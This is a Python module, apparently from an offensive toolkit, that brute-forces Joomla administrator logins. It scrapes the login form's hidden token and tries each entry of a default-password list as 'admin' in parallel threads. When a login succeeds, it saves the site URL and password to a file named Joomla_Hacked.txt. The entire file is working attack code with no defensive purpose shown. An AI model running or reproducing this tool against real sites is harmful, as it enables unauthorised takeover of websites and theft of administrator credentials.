# coding=utf-8
import requests, re, threading, time
from Exploits import printModule
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
passwords = open('files/DefaultPasswords_Joomla.txt', 'r').read().splitlines()

class JooMLaBruteForce(object):
    def __init__(self):
        self.flag = 0
        self.password = passwords

    def Run(self, site):
        thread = []
        for passwd in self.password:
            t = threading.Thread(target=self.Joomla, args=(site, passwd))
            if self.flag == 1:
                break
            else:
                t.start()
                thread.append(t)
                time.sleep(0.08)
        for j in thread:
            j.join()
        if self.flag == 0:
            return printModule.returnNo(site, 'N/A', 'Joomla Bruteforce', 'Joomla')
        else:
            return printModule.returnYes(site, 'N/A', 'Joomla Bruteforce', 'Joomla')

    def Joomla(self, site, passwd):
        try:
            agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            sess = requests.session()
            GetToken = sess.get('http://' + site + '/administrator/index.php', timeout=5, headers=agent)
            try:
                ToKeN = re.findall('type="hidden" name="(.*)" value="1"',
                                   str(GetToken.text))[0]
                GeTOPtIoN = re.findall('type="hidden" name="option" value="(.*)"', str(GetToken.text))[0]
            except:
                ToKeN = ''
                GeTOPtIoN = 'com_login'
            post = {}
            post['username'] = "admin"
            post['passwd'] = passwd
            post['lang'] = 'en-GB'
            post['option'] = GeTOPtIoN
            post['task'] = 'login'
            post[ToKeN] = '1'
            url = "http://" + site + "/administrator/index.php"
            GoT = sess.post(url, data=post, headers=agent, timeout=10)
            if 'logout' in str(GoT.content) and '/index.php?option=com_users&amp;task=user.edit' in str(GoT.content):
                with open('result/Joomla_Hacked.txt', 'a') as writer:
                    writer.write('http://' + site + '/administrator/index.php' + '\n Username: admin' +
                                 '\n Password: ' + passwd + '\n-----------------------------------------\n')
                self.flag = 1
        except:
            pass

